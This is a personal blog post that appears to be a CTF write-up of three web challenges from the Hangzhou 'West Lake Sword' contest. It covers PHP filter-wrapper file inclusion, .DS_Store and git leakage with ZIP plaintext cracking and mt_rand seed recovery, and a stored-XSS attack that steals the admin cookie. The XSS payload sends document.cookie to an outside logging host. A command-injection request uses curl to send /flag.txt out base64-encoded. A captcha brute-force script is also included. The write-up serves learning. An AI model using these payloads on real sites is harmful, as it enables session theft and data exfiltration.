@@ -1,0 +1,746 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>杭州&#34;西湖论剑&#34;ctf-Web | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="ctf">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="ctf">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="杭州&quot;西湖论剑&quot;ctf-Web">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/42277/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="ctf">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/1.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/2.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/3.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/5.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/6.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/10.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/7.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/8.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/9.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/11.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/12.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/杭州ctf/13.png">
+<meta property="og:updated_time" content="2019-04-11T15:19:27.619Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="杭州&quot;西湖论剑&quot;ctf-Web">
+<meta name="twitter:description" content="ctf">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/杭州ctf/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">杭州&#34;西湖论剑&#34;ctf-Web</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#babyt3"><span class="post-toc-number">1.</span> <span class="post-toc-text">babyt3</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#猜猜flag是什么"><span class="post-toc-number">2.</span> <span class="post-toc-text">猜猜flag是什么</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#breakout"><span class="post-toc-number">3.</span> <span class="post-toc-text">breakout</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-杭州“西湖论剑”ctf-Web"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">杭州"西湖论剑"ctf-Web</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-04-11 15:15:00" datetime="2019-04-11T07:15:00.000Z"  itemprop="datePublished">2019-04-11</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/ctf/">ctf</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">7</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>这场比赛打了个酱油，只解了3题。意识到自己还需更加努力学习，趁着平台再次开放，复现一下Web的三道题<a id="more"></a></p>
+<h4 id="babyt3"><a href="#babyt3" class="headerlink" title="babyt3"></a>babyt3</h4><p>题目链接：<a href="http://61.164.47.198:10000/" target="_blank" rel="noopener">http://61.164.47.198:10000/</a> </p>
+<p>页面直接给出了提示<code>include $_GET[&#39;file&#39;]</code>，是一个文件包含题目</p>
+<p>利用PHP伪协议读取<code>index.php</code>经过base64加密后的源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span> (!$a) &#123;</span><br><span class="line">	$a = <span class="string">'./templates/index.html'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'include $_GET[\'file\']'</span>;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="string">'flag'</span>,$a)!==<span class="keyword">false</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'nonono'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--hint: ZGlyLnBocA== --&gt;</span><br></pre></td></tr></table></figure>
+<p>源代码又给出了提示<code>hint:ZGlyLnBocA==</code>，base64解密后得到<code>dir.php</code></p>
+<p>继续用伪协议读<code>dir.php</code>的源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?file=php://filter/convert.base64-encode/resource=dir.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = @$_GET[<span class="string">'dir'</span>];</span><br><span class="line"><span class="keyword">if</span>(!$a)&#123;</span><br><span class="line">$a = <span class="string">'/tmp'</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(scandir($a));</span><br></pre></td></tr></table></figure>
+<p>发现读取目录下文件的函数<code>scandir</code>，读取根目录发现flag文件<code>dir.php?dir=/</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/杭州ctf/1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>再次利用伪协议读取flag文件，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?file=php://filter/convert.base64-encode/resource=/ffffflag_1s_Her4</span><br></pre></td></tr></table></figure>
+<p>解密后获得flag：<code>flag{8dc25fd21c52958f777ce92409e2802a}</code></p>
+<h4 id="猜猜flag是什么"><a href="#猜猜flag是什么" class="headerlink" title="猜猜flag是什么"></a>猜猜flag是什么</h4><p>题目链接：<a href="http://61.164.47.198:10002/" target="_blank" rel="noopener">http://61.164.47.198:10002</a> </p>
+<p><img src="/img/杭州ctf/2.png" alt=""></p>
+<p>一开始通过GET方式提交参数<code>name</code>，发现页面会返回我们输入的参数<code>name</code>的值，尝试了一下XSS，<code>?name=%253cscript%253e%253c/script%253e</code>，弹出了<code>hint:e10adc3949ba59abbe56e057f20f883e</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/杭州ctf/3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>md5解密是123456，但是一直没懂这个提示的意思，用御剑扫后台也没有扫到什么有用的</p>
+<p>比赛结束后，参考别人的WP发现这题就是路径泄露</p>
+<p>首先，通过<code>dirsearch</code>工具扫描目录，该工具下载链接：<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/杭州ctf/4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>扫描到<code>/.DS_Store</code></p>
+<p>再通过<code>ds_store_exp</code>工具进行还原，该工具下载链接：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/杭州ctf/5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>还原结果发现存在目录<code>/e10adc3949ba59abbe56e057f20f883e</code>，即前面发现的提示</p>
+<p>访问<code>/e10adc3949ba59abbe56e057f20f883e/.git</code>，发现存在git文件泄露，使用<code>githack</code>工具还原</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/杭州ctf/6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>还原后发现压缩包<code>BackupForMySite.zip</code>，但是被加密，发现里面存在<code>lengzhu.jpg</code>，得知这是一个明文攻击</p>
+<p>先将<code>lengzhu.jpg</code>通过2345好压压缩为<code>lengzhu.zip</code>，再与<code>BackupForMySite.zip</code>通过<code>ARCHPR</code>工具进行明文攻击，</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/杭州ctf/10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>进行解密一段时间后，虽然没有得到解压密码，但是得到解压后的压缩包</p>
+<p>解压后得到<code>hint</code>内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code is 9faedd5999937171912159d28b219d86</span><br><span class="line">well ok ur good...By the way, flag saved in flag/seed.txt</span><br></pre></td></tr></table></figure>
+<p>看到<code>code</code>想到了首页的code兑换码，于是访问<code>/?code=9faedd5999937171912159d28b219d86</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/杭州ctf/7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>得到一个数字：<code>4795334</code>，看样子不像是flag</p>
+<p><code>hint</code>中还有内容<code>flag saved in flag/seed.txt</code>，但是访问<code>/flag/seed.txt</code>也没有得到flag</p>
+<p>但是看到seed就想到了这是一个随机数，需要工具<code>php_mt_seed</code>进行破解，该工具下载链接：<a href="https://www.openwall.com/php_mt_seed/，下载解压后进入目录执行`make`得到`php_mt_seed`" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/，下载解压后进入目录执行`make`得到`php_mt_seed`</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/杭州ctf/8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>解密后的结果逐一尝试</p>
+<p>访问<code>/flag/309551.txt</code>得到flag：<code>flag{0730b6193000e9334b12cf7c95fbc736}</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/杭州ctf/9.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<h4 id="breakout"><a href="#breakout" class="headerlink" title="breakout"></a>breakout</h4><p>题目链接：<a href="http://61.164.47.198:10001/" target="_blank" rel="noopener">http://61.164.47.198:10001</a> </p>
+<p>题目一开始为登录页面，但是完全不需要输入任何用户名和密码即可登录，登录后，有三个页面：<code>/main.php</code>为留言页面；<code>/report.php</code>为提交URL页面，提交完成后管理员会访问；<code>/exec.php</code>为命令执行页面，但是只有管理员才可以执行命令</p>
+<p>题目思路挺明确的，利用留言页面进行XSS注入，再提交留言页面的URL，窃取到管理员的cookie，最后执行命令获取flag</p>
+<p>首先在留言页面进行XSS注入，通过测试后台将<code>script</code>替换成<code>:)</code>，所以考虑用img标签的onerror事件，将<code>空格+onerror=</code>替换成了<code>:)</code>，绕过方法是将<code>onerror</code>和<code>=</code>之间换行，注入内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror</span><br><span class="line">=alert(/xss/)&gt;</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/杭州ctf/11.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>成功执行弹框，那么接下来只要控制onerror事件内容即可将管理员cookie发送到自己的服务器，payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror</span><br><span class="line">=&quot;var img = new Image();img.src=&apos;http://fw5can.ceye.io/?c=&apos;+document.cookie;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>当管理员访问<code>/main.php</code>时，触发onerror事件后就会将自己的cookie值提交到我们的服务器上，我们即可在服务器的日志信息上发现</p>
+<p>接下来，需要在<code>/report.php</code>中提交<code>/main.php</code>页面的URL值，但是这里必须同时要提交正确的验证码，验证码的条件为：<code>substr(md5($str), 0, 6) === xxxxxx</code>，即我们提交的验证码经过md5加密后的前六位为指定的随机6位数字，因为每次访问页面，产生的6位数字都不同，所以需要通过脚本进行提交，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(s.encode(encoding=<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">"http://61.164.47.198:10001/report.php"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=s3dp9m5qpg6f10138g99bnt1p7; token=1B2M2Y8AsgTpgAmY7PhCfg%3D%3D'</span></span><br><span class="line">    &#125;</span><br><span class="line">r = s.get(url,headers=headers)</span><br><span class="line">code = re.findall(<span class="string">r'=== (.*)&lt;'</span>,r.text)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print("code:",code)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9999999</span>):</span><br><span class="line">    <span class="keyword">if</span> md5(str(i)).startswith(code):</span><br><span class="line">        <span class="comment">#print("md5(str(i)) ==",md5(str(i)))</span></span><br><span class="line">        <span class="comment">#print("i:",i)</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'url'</span>:<span class="string">'http://61.164.47.198:10001/main.php'</span>,</span><br><span class="line">    <span class="string">'code'</span>:i</span><br><span class="line">    &#125;</span><br><span class="line">r2 = s.post(url,data=data,headers=headers)</span><br><span class="line">r2.encoding = r2.apparent_encoding</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/杭州ctf/12.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>运行后可以看到页面返回提交成功的信息</p>
+<p>接下来，回到自己服务器，查看日志内容：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/杭州ctf/13.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>成功窃取到管理员的cookie值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20admin=admin_!@@!_admin_admin_hhhhh;</span><br></pre></td></tr></table></figure>
+<p>最后，来到命令执行<code>exec.php</code>页面，提交执行的命令，加上管理员的cookie，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /exec.php HTTP/1.1</span><br><span class="line">Host: 61.164.47.198:10001</span><br><span class="line">Content-Length: 78</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://61.164.47.198:10001</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://61.164.47.198:10001/exec.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=s3dp9m5qpg6f10138g99bnt1p7; token=1B2M2Y8AsgTpgAmY7PhCfg%3D%3D;admin=admin_!@@!_admin_admin_hhhhh;</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">command=curl http://fw5can.ceye.io/?$(cat /flag.txt | base64)&amp;exec=1</span><br></pre></td></tr></table></figure>
+<p>再次访问日志，经过base64解密后获取flag值：<code>flag{fa51320ae808c70485dd5f30337026d6}</code></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-04-11T15:19:27.619Z" itemprop="dateUpdated">2019-04-11 23:19:27</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/42277/" target="_blank" rel="external">https://Foxgrin.github.io/posts/42277/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/42277/&title=《杭州"西湖论剑"ctf-Web》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/42277/&title=《杭州"西湖论剑"ctf-Web》 — Somnus's blog&source=这场比赛打了个酱油，只解了3题。意识到自己还需更加努力学习，趁着平台再次开放，复现一下Web的三道题" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/42277/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《杭州"西湖论剑"ctf-Web》 — Somnus's blog&url=https://Foxgrin.github.io/posts/42277/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/42277/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/6882/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：DDCTF-Web
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/52899/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：ringzer0ctf-sql注入">下一篇：ringzer0ctf-sql注入</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/42277/&title=《杭州"西湖论剑"ctf-Web》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
